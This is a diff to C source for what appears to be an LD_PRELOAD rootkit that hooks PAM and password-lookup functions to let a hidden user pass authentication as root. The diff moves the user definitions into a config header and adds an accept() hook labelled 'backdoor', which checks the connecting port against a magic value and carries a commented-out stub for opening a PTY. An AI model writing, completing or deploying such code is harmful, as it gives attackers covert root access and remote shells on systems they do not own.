@@ -11,15 +11,16 @@
 */
 
 #define  _GNU_SOURCE
-#include "libcalls.h"
 #include <string.h>
 #include <sys/types.h>
 #include <pwd.h>
 #include <security/pam_appl.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include "config.h"
+#include "libcalls.h"
 
-/* PAM definitions */
-#define SU_USER   "h0h0"
-#define JACK_USER "root"
 
 /* PAM hooks: */
 int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
@@ -52,4 +53,21 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags)
         return PAM_SUCCESS;
 
     return (int) libcalls[PAM_ACCT_MGMT](pamh, flags);
+}
+
+/* accept() backdoor. */
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
+{
+	unsigned short int port;
+	int retval;
+	
+	retval    = (int) libcalls[ACCEPT](sockfd, addr, addrlen);
+	port      = ntohs(((struct sockaddr_in *) addr)->sin_port);
+
+/*
+	if(port == MAGIC_PORT)
+		** Open a PTY? **
+*/
+
+	return retval;
 }
